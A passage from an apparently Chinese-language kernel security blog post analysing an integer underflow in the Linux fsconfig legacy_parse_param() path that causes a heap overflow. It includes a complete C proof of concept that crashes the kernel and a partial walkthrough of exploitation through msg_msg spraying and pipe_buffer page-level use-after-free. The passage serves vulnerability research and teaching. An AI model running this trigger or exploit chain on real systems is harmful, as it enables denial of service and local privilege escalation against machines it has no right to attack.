class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这一套流程下来便是 new Filesystem mount API 的基本用法</p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><h2 id="legacy-parse-param-整型溢出导致的越界拷贝"><a href="#legacy-parse-param-整型溢出导致的越界拷贝" class="headerlink" title="legacy_parse_param() - 整型溢出导致的越界拷贝"></a>legacy_parse_param() - 整型溢出导致的越界拷贝</h2><p>前面我们提到该漏洞发生于 <code>fsconfig()</code> 系统调用中，若我们给的 <code>cmd</code> 为 <code>FSCONFIG_SET_STRING</code>，则在内核中存在如下调用链：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">fsconfig</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_fsconfig_locked</span>()</span><br><span class="hljs-function"><span class="hljs-title">vfs_parse_fs_param</span>()</span><br></code></pre></td></tr></table></figure><p>在 <code>vfs_parse_fs_param()</code> 中会调用 <code>fs_context-&gt;ops-&gt;parse_param</code> 函数指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vfs_parse_fs_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;<br>ret = fc-&gt;ops-&gt;parse_param(fc, param);<br><span class="hljs-keyword">if</span> (ret != -ENOPARAM)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>前面我们讲到对于未设置 <code>init_fs_context</code> 的文件系统类型而言其最终会调用 <code>legacy_init_fs_context()</code> 进行初始化，其中 <code>fs_context</code> 的函数表会被设置为 <code>legacy_fs_context_ops</code>，其 <code>parse_param</code> 指针对应为 <code>legacy_parse_param()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> <span class="hljs-title">legacy_fs_context_ops</span> =</span> &#123;<br>.<span class="hljs-built_in">free</span>= legacy_fs_context_free,<br>.dup= legacy_fs_context_dup,<br>.parse_param= legacy_parse_param,<br>.parse_monolithic= legacy_parse_monolithic,<br>.get_tree= legacy_get_tree,<br>.reconfigure= legacy_reconfigure,<br>&#125;;<br></code></pre></td></tr></table></figure><p>漏洞便发生在该函数中，在计算 <code>len &gt; PAGE_SIZE - 2 - size</code> 时，由于 size 为 <code>unsigned int</code> ，若 <code>size + 2 &gt; PAGE_SIZE</code> ，则 <code>PAGE_SIZE - 2 - size</code> 的结果<strong>会下溢为一个较大的无符号值，从而绕过 len 的检查</strong>，这里的 size 来源为 <code>ctx-&gt;data_size</code>，即<strong>已拷贝的总的数据长度</strong>，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Add a parameter to a legacy config.  We build up a comma-separated list of</span><br><span class="hljs-comment"> * options.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">legacy_parse_param</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> fs_context *fc, <span class="hljs-keyword">struct</span> fs_parameter *param)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">legacy_fs_context</span> *<span class="hljs-title">ctx</span> =</span> fc-&gt;fs_private;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size = ctx-&gt;data_size; <span class="hljs-comment">// 已拷贝的数据长度</span><br><span class="hljs-type">size_t</span> len = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(param-&gt;key, <span class="hljs-string">&quot;source&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (param-&gt;type != fs_value_is_string)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Non-string source&quot;</span>);<br><span class="hljs-keyword">if</span> (fc-&gt;source)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Multiple sources&quot;</span>);<br>fc-&gt;source = param-&gt;<span class="hljs-built_in">string</span>;<br>param-&gt;<span class="hljs-built_in">string</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (ctx-&gt;param_type == LEGACY_FS_MONOLITHIC_PARAMS)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Can&#x27;t mix monolithic and individual options&quot;</span>);<br><br><span class="hljs-comment">// 计算 len</span><br><span class="hljs-keyword">switch</span> (param-&gt;type) &#123;<br><span class="hljs-keyword">case</span> fs_value_is_string:<span class="hljs-comment">// 对应 FSCONFIG_SET_STRING</span><br>len = <span class="hljs-number">1</span> + param-&gt;size;<br><span class="hljs-comment">/* Fall through */</span><br><span class="hljs-keyword">case</span> fs_value_is_flag:<br>len += <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Parameter type for &#x27;%s&#x27; not supported&quot;</span>,<br>      param-&gt;key);<br>&#125;<br><br><span class="hljs-comment">// 此处存在整型溢出的漏洞，若 size + 2 大于一张页的大小则会上溢为一个较大的无符号整型，</span><br><span class="hljs-comment">// 导致此处通过检查，从而导致后续步骤中的越界拷贝</span><br><span class="hljs-keyword">if</span> (len &gt; PAGE_SIZE - <span class="hljs-number">2</span> - size)<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Cumulative options too large&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(param-&gt;key, <span class="hljs-string">&#x27;,&#x27;</span>) ||<br>    (param-&gt;type == fs_value_is_string &amp;&amp;<br>     <span class="hljs-built_in">memchr</span>(param-&gt;<span class="hljs-built_in">string</span>, <span class="hljs-string">&#x27;,&#x27;</span>, param-&gt;size)))<br><span class="hljs-keyword">return</span> invalf(fc, <span class="hljs-string">&quot;VFS: Legacy: Option &#x27;%s&#x27; contained comma&quot;</span>,<br>      param-&gt;key);<br></code></pre></td></tr></table></figure><p>在后面的流程中会从用户控件将数据拷贝到  <code>ctx-&gt;legacy_data</code>  上，而 <code>ctx-&gt;legacy_data</code> 仅分配了一张页面大小，但后续流程中的拷贝是从 <code>ctx-&gt;legacy_data[size]</code> 开始的，<strong>由于 size 可以大于一张页大小，因此此处可以发生数据数据写入</strong>，由于 <code>ctx-&gt;legacy_data</code> 在分配时使用的是通用的分配 flag <code>GFP_KERNEL</code>，因此可以溢出到绝大多数的常用结构体中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 为 legacy_data 分配一张页的大小</span><br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data) &#123;<br>ctx-&gt;legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!ctx-&gt;legacy_data)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;,&#x27;</span>;<br>len = <span class="hljs-built_in">strlen</span>(param-&gt;key);<br><span class="hljs-comment">// size 可以大于一张页，但是 legacy_data 只有一张页，从而导致了越界拷贝</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;key, len);<br>size += len;<br><span class="hljs-keyword">if</span> (param-&gt;type == fs_value_is_string) &#123;<br>ctx-&gt;legacy_data[size++] = <span class="hljs-string">&#x27;=&#x27;</span>;<br><span class="hljs-comment">// size 可以大于一张页，但是 legacy_data 只有一张页，从而导致了越界拷贝</span><br><span class="hljs-built_in">memcpy</span>(ctx-&gt;legacy_data + size, param-&gt;<span class="hljs-built_in">string</span>, param-&gt;size);<br>size += param-&gt;size;<br>&#125;<br>ctx-&gt;legacy_data[size] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>ctx-&gt;data_size = size;<br>ctx-&gt;param_type = LEGACY_FS_INDIVIDUAL_PARAMS;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里需要注意的是，由于 fsconfig 的限制，我们单次写入的最大长度为 256 字节，因此我们需要多次调用 fsconfig 以让其逐渐逼近 <code>PAGE_SIZE</code>，而 <code>len &gt; PAGE_SIZE - 2 - size</code> 的检查<strong>并非完全无效</strong>，由于 size 为已拷贝数据长度而 len 为待拷贝数据长度，因此<strong>只有当 size 累加到 4095 时才会发生整型溢出</strong>，这里我们在进行溢出前需要卡好已拷贝数据长度<strong>刚好为 <code>4095</code></strong></p><p>由于 <code>legacy_parse_param()</code> 中拷贝的结果形式为 <code>&quot;,key=val&quot;</code>，故我们有如下计算公式：</p><ul><li><code>单次拷贝数据长度 = len(key) + len(val) + 2</code></li></ul><p>下面笔者给出一个笔者自己计算的 4095：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment"> * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>&#125;<br>fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>由于大部分的文件系统类型都未设置 <code>init_fs_context</code>，因此最后都可以走到 <code>legacy_parse_param()</code> 的流程当中，例如 <code>ext4</code> 文件系统的 <code>file_system_type</code> 定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> <span class="hljs-title">ext4_fs_type</span> =</span> &#123;<br>.owner= THIS_MODULE,<br>.name= <span class="hljs-string">&quot;ext4&quot;</span>,<br>.mount= ext4_mount,<br>.kill_sb= kill_block_super,<br>.fs_flags= FS_REQUIRES_DEV,<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里我们将通过 ext4 文件系统进行漏洞复现，我们只需要越界写足够长的一块内存，通常都能写到一些内核结构体从而导致 kernel panic</p><p>需要注意的是 filesystem mount API 需要命名空间具有  <code>CAP_SYS_ADMIN</code> 权限，但由于其<strong>仅检查命名空间权限</strong>，故对于没有该权限的用户则可以通过 <code>unshare(CLONE_NEWNS|CLONE_NEWUSER)</code> 创建新的命名空间，以在新的命名空间内获取对应权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER);<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* make an oob-write by fsconfig */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x4000</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行，成功通过堆溢出造成 kernel panic：</p><p><img src="https://s2.loli.net/2023/01/08/KmX1LNFrDQPpd9u.png" alt="image.png"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>下面笔者给出两种利用方法，其中第二重尚未经过验证（不过理论上可行）</p><h2 id="方法一、覆写-pipe-buffer-构造页级-UAF"><a href="#方法一、覆写-pipe-buffer-构造页级-UAF" class="headerlink" title="方法一、覆写 pipe_buffer 构造页级 UAF"></a>方法一、覆写 <code>pipe_buffer</code> 构造页级 UAF</h2><blockquote><p>虽然这篇博客写于 1 月，但是这个通用利用方法笔者最初公开于 4 月份的 <a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^3CTF2023-d3kcache</a> 中，后面想了想用在这个漏洞上也是挺好的，所以现在给出一份使用该方法进行利用的 exp ：）</p></blockquote><h3 id="Step-I-利用-msg-msg-定位溢出位置"><a href="#Step-I-利用-msg-msg-定位溢出位置" class="headerlink" title="Step.I - 利用 msg_msg 定位溢出位置"></a>Step.I - 利用 <code>msg_msg</code> 定位溢出位置</h3><p>由于下次写入必定会向下一个对象内写入一个 <code>&#39;=&#39;</code> 和一个 <code>&#39;\0&#39;</code> ，而这个 <code>&#39;=&#39;</code> 就很不可爱，因此我们选择<strong>不直接利用与其相邻的第一个 4k 对象，而是覆写与其相邻的第二个 4k 对象</strong>，这样我们便能只向第二个 4k 对象内写入一个可爱的 <code>\x00</code> ：）</p><p>这里笔者选择首先堆喷 <code>msg_msg</code>，利用漏洞将 <code>m_ts</code> 改大，通过 <code>MSG_COPY</code> 读取检查被覆写的 <code>msg_msg</code> 并<strong>释放除了该 msg_msg 以外的其他 msg_msg</strong></p><h3 id="Step-II-fcntl-F-SETPIPE-SZ-更改-pipe-buffer-所在-slub-大小，构造页级-UAF"><a href="#Step-II-fcntl-F-SETPIPE-SZ-更改-pipe-buffer-所在-slub-大小，构造页级-UAF" class="headerlink" title="Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，构造页级 UAF"></a>Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，构造页级 UAF</h3><p>接下来我们考虑溢出的目标对象，现在我们仅想要使用一个 <code>\x00</code> 字节完成利用，毫无疑问的是我们需要寻找一些在结构体头部便有指向其他内核对象的指针的内核对象，我们不难想到的是 <code>pipe_buffer</code> 是一个非常好的的利用对象，其开头有着指向 <code>page</code> 结构体的指针，而 <code>page</code> 的大小仅为 <code>0x40</code> ，可以被 0x100 整除，若我们能够<strong>通过 partial overwrite 使得两个管道指向同一张页面，并释放掉其中一个</strong>，我们便构造出了<strong>页级的 UAF</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png" alt="original state"></p><p><img src="https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png" alt="null-byte partial overwrite"></p><p><img src="https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png" alt="page-level UAF"></p><p>同时<strong>管道的特性还能让我们在 UAF 页面上任意读写</strong>，这真是再美妙不过了：）</p><p>但是有一个小问题，<code>pipe_buffer</code> 来自于 <code>kmalloc-cg-1k</code> ，其会请求 order-2 的页面，而漏洞对象大小为 4k，其会请求 order-3 的页面，如果我们直接进行不同 order 间的堆风水的话，则利用成功率会大打折扣 :（</p><p>但 pipe 可以被挖掘的潜力远比我们想象中大得多：）现在让我们重新审视 <code>pipe_buffer</code> 的分配过程，其实际上是单次分配 <code>pipe_bufs</code> 个 <code>pipe_buffer</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>这里注意到 <code>pipe_buffer</code> <strong>不是一个常量而是一个变量</strong>，那么<strong>我们能否有方法修改 pipe_buffer 的数量？</strong>答案是肯定的，pipe 系统调用非常贴心地为我们提供了 <code>F_SETPIPE_SZ</code> <strong>让我们可以重新分配 pipe_buffer 并指定其数量</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">pipe_fcntl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">long</span> ret;<br><br>pipe = get_pipe_info(file, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!pipe)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>ret = pipe_set_size(pipe, arg);<br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_set_size</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>ret = pipe_resize_ring(pipe, nr_slots);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br></code></pre></td></tr></table></figure><p>那么我们不难想到的是<strong>我们可以通过 fcntl() 重新分配单个 pipe 的 pipe_buffer 数量，</strong>：</p><ul><li>对于每个 pipe 我们<strong>指定分配 64 个 pipe_buffer，从而使其向 kmalloc-cg-2k 请求对象，而这将最终向 buddy system 请求 order-3 的页面</strong></li></ul><p>由此，我们便成功使得 <code>pipe_buffer</code> 与题目模块的对象<strong>处在同一 order 的内存页上</strong>，从而提高 cross-cache overflow 的成功率</p><p>不过需要注意的是，由于 page 结构体的大小为 0x40，其可以被 0x100 整除，因此若我们所溢出的目标 page 的地址最后一个字节刚好为 <code>\x00</code>，  <em>那就等效于没有溢出</em>  ，因此实际上利用成功率仅为 <code>75% </code> （悲）</p><h3 id="Step-III-构造二级自写管道，实现任意内存读写"><a href="#Step-III-构造二级自写管道，实现任意内存读写" class="headerlink" title="Step.III - 构造二级自写管道，实现任意内存读写"></a>Step.III - 构造二级自写管道，实现任意内存读写</h3><p>有了 page-level UAF，我们接下来考虑向这张页面分配什么结构体作为下一阶段的 victim object</p><p>由于管道本身便提供给我们读写的功能，而我们又能够调整 <code>pipe_buffer</code> 的大小并重新分配结构体，那么再次选择 <code>pipe_buffer</code> 作为 victim object 便是再自然不过的事情：）</p><p><img src="https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png" alt="image.png"></p><p>接下来我们可以通过 UAF 管道<strong>读取 pipe_buffer 内容，从而泄露出 page、pipe_buf_operations 等有用的数据</strong>（可以在重分配前预先向管道中写入一定长度的内容，从而实现数据读取），由于我们可以通过 UAF 管道直接改写 <code>pipe_buffer</code> ，因此将漏洞转化为 dirty pipe 